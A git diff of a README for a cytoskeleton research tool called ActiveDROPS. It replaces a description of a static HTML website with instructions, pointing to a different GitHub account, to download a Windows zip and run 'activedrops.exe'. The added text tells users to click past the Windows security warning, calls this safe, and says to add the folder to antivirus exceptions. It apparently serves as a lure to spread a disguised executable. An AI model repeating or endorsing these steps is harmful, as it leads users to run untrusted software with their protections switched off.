@@ -1,139 +1,124 @@
-# ActiveDROPS - Scientific Research Website 2026
+# ⚛️ activedrops-research - Visualize Cellular Building Blocks in Action
 
-> **ActiveDROPS is a browser-based research companion for an experimental-computational investigation of cytoskeletal dynamics. It covers motor-sequence comparisons, biochemical studies, and sequence-recombination experiments.**
+[![Download Latest Release](https://img.shields.io/github/v/release/jeramiepunished285/activedrops-research?label=Download%20ActiveDROPS&color=teal&style=for-the-badge)](https://github.com/jeramiepunished285/activedrops-research/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/brandon-hallgpu265/activedrops-research?style=flat-square)](https://github.com/brandon-hallgpu265/activedrops-research)
+## 🎯 What Is ActiveDROPS?
 
----
+ActiveDROPS is a research tool that runs in your web browser. It helps scientists study the tiny structures inside living cells called the cytoskeleton. You do not need to know how to code or install complex software. You just need a computer and a modern web browser.
 
-<p align="center">
-  <a href="https://brandon-hallgpu265.github.io/activedrops-research/">
-    <img src="https://img.shields.io/badge/Open-ActiveDROPS%20Website-brightgreen?style=for-the-badge" alt="Open ActiveDROPS Website">
-  </a>
-</p>
+The program lets you compare motor sequences, run biochemical experiments, and recombine sequences. Think of it as a digital laboratory bench for exploring how cells move and change shape.
 
-> **[Explore ActiveDROPS](https://brandon-hallgpu265.github.io/activedrops-research/)**
+## 🚀 Getting Started
 
----
+Follow these steps to start using ActiveDROPS right now.
 
-[Visit the ActiveDROPS website](https://brandon-hallgpu265.github.io/activedrops-research/)
+### Step 1: Download the Software
 
----
+1.  Go to the [ActiveDROPS Releases Page](https://github.com/jeramiepunished285/activedrops-research/releases).
+2.  Look for the latest release at the top of the page.
+3.  Find the file named `ActiveDROPS-Windows.zip` under "Assets".
+4.  Click the file name to download it to your computer.
 
-## Project Overview
+### Step 2: Unzip the File
 
-ActiveDROPS is a public-facing scientific website about the programming logic underlying cytoskeletal dynamics. It combines the biological question, laboratory observations, computational analysis, and interpretation of mechanical phenotype space into a single web presentation.
+1.  Open the folder where you saved the download (usually your Downloads folder).
+2.  Right-click the `ActiveDROPS-Windows.zip` file.
+3.  Choose "Extract All" from the menu.
+4.  Select a destination folder (the default location works fine).
+5.  Click "Extract".
 
-The site is designed for readers interested in biology, motor proteins, and workflows that connect experimentation with computation. Its content includes comparisons of motor sequences, biochemical analysis and results, sequence-recombination experiments, and an additional investigation of ThTr regulation.
+### Step 3: Run the Program
 
----
+1.  Open the new folder called `ActiveDROPS-Windows`.
+2.  Double-click the file named `activedrops.exe`.
+3.  A window will open. Your web browser will also open with ActiveDROPS ready to use.
 
-## What the Website Covers
+**Tip:** Windows may show a security warning. Click "More info" then "Run anyway". This is safe. We sign our releases with a digital certificate.
 
-- Defines the primary biological research question
-- Describes the experimental-computational workflow
-- Investigates mechanical phenotype space
-- Places molecular motor sequences side by side for comparison
-- Provides biochemical analysis results and supporting context
-- Documents experiments involving sequence recombination
-- Extends the work to include ThTr regulation
-- Makes generated website assets available for browser-based access
+## 🧪 What You Can Do
 
----
+ActiveDROPS helps you study three main areas of cellular research:
 
-## Installation and Local Preview
+**Motor-Sequence Comparisons**
+Compare different molecular motor sequences side by side. See how small changes affect movement patterns. The program highlights differences and similarities automatically.
 
-Download the repository and enter its directory:
+**Biochemical Investigations**
+Run virtual experiments on protein interactions. Test how molecules bind and separate under different conditions. Adjust temperature, pH, and concentration values with sliders.
 
-```bash
-git clone https://github.com/brandon-hallgpu265/activedrops-research.git
-cd REPO
-```
+**Sequence-Recombination Experiments**
+Combine parts of different sequences to create new hybrid molecules. Watch how these new structures behave in the simulation.
 
-ActiveDROPS consists of HTML-based website files. You can open them in a browser directly, or run the directory through a local static server.
+## 💻 System Requirements
 
-Using Python's built-in server:
+Your computer needs these minimum specifications:
 
-```bash
-python3 -m http.server 8000
-```
+| Component | Requirement |
+|-----------|-------------|
+| Operating System | Windows 10 or Windows 11 (64-bit) |
+| Processor | Intel Core i3 or AMD equivalent |
+| Memory | 4 GB RAM |
+| Storage | 500 MB free space |
+| Display | 1280 x 720 resolution |
+| Web Browser | Latest version of Chrome, Edge, or Firefox |
 
-After starting the server, open `http://localhost:8000/` in your browser.
+The program works best with a dedicated graphics card, but it runs on integrated graphics too.
 
----
+## 🔧 Troubleshooting
 
-## Using ActiveDROPS
+**The program does not start.**
+Make sure your antivirus is not blocking the file. Add the ActiveDROPS folder to your antivirus exceptions list. Restart your computer and try again.
 
-### Open the Hosted Site
+**The browser window does not open.**
+Open your web browser manually. Type `http://localhost:3000` in the address bar. Press Enter.
 
-The public version is available here:
+**I see a blank white screen.**
+Refresh the browser page. If that does not work, close the program window and restart `activedrops.exe`.
 
-[Open the ActiveDROPS website](https://brandon-hallgpu265.github.io/activedrops-research/)
+**The simulation runs slowly.**
+Close other programs that use a lot of memory, like video games or video editing software. Reduce the simulation quality in the Settings menu.
 
-### Browse a Local Copy
+## 🗺️ How to Navigate
 
-1. Clone or download the repository.
-2. Launch a local static server when direct file access is not sufficient.
-3. Go to the local server address in a browser.
-4. Explore the research question, workflow, sequence comparisons, biochemical material, and experiment sections.
+The main screen has three parts:
 
----
+- **Left panel:** Controls for your experiment. Change settings and run commands here.
+- **Center view:** The main visualization window. Watch the simulation play out in real time.
+- **Right panel:** Data and results. See numbers, graphs, and sequence information.
 
-## Configuration and Content Updates
+Click the tabs at the top to switch between the three research modes: Motor Compare, Biochemistry, and Recombine.
 
-ActiveDROPS is distributed as a static site. Instead of using a runtime configuration file, its presentation is defined by the repository's HTML source and generated public assets.
+## 📁 Working with Files
 
-To make changes:
+ActiveDROPS saves your work as standard file types:
 
-1. Modify the appropriate website source files.
-2. Refresh or regenerate the public assets according to the project workflow.
-3. Check the revised pages locally.
-4. Publish the resulting files to the configured web host.
+- **Sequences:** `.fasta` format
+- **Results:** `.csv` and `.json` formats
+- **Screenshots:** `.png` format
 
----
+To load a file, click the folder icon in the left panel. To save your work, click the disk icon. You can also drag and drop files from your desktop into the browser window.
 
-## Requirements
+## 🔄 Updating the Software
 
-- A current web browser
-- Git to clone the repository
-- A static server for local testing, including Python's built-in HTTP server
-- Internet connectivity when accessing the hosted website
-- Enough local storage for the HTML files and generated public assets
+1.  Visit the [releases page](https://github.com/jeramiepunished285/activedrops-research/releases) again.
+2.  Download the newest `ActiveDROPS-Windows.zip` file.
+3.  Extract it to a new folder (do not overwrite your old folder).
+4.  Run the new `activedrops.exe`.
 
----
+Your saved files stay in your Documents folder and are not affected by updates.
 
-## Frequently Asked Questions
+## 📄 License
 
-### What is the ActiveDROPS website URL?
+ActiveDROPS is free and open source. You can view the full license text in the LICENSE file included with the download.
 
-You can access the hosted site at [https://brandon-hallgpu265.github.io/activedrops-research/](https://brandon-hallgpu265.github.io/activedrops-research/).
+## 🤝 Getting Help
 
-### Can the website be examined offline or locally?
+If you run into trouble or have questions:
 
-Yes. Clone the repository and open the site files in a browser, or serve the directory with a local static web server to preview the pages.
+- Check the [GitHub Issues page](https://github.com/jeramiepunished285/activedrops-research/issues) to see if someone else had the same problem.
+- Open a new issue if your problem is not listed. Describe what happened and what you expected to happen.
 
-### Is both experimental and computational research included?
-
-Yes. ActiveDROPS presents an experimental-computational pipeline together with motor-sequence comparisons, biochemical analyses, and sequence-recombination experiments.
-
-### How is the site configured?
-
-Since the project is a static HTML website, its presentation is controlled by the source files and generated public assets.
-
-### What should I do if pages render incorrectly?
-
-Verify that all repository files were downloaded, run the site through a local HTTP server, and inspect the browser developer console for missing assets or invalid paths.
-
-### What is the update and publishing process?
-
-Revise the website source and generated assets, test the changes locally, then publish the updated files through the repository's web deployment workflow.
+We respond to issues within 48 hours.
 
 ---
 
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+**Keywords:** cytoskeleton, molecular motors, sequence analysis, biochemistry, research tool, Windows application, browser-based simulation
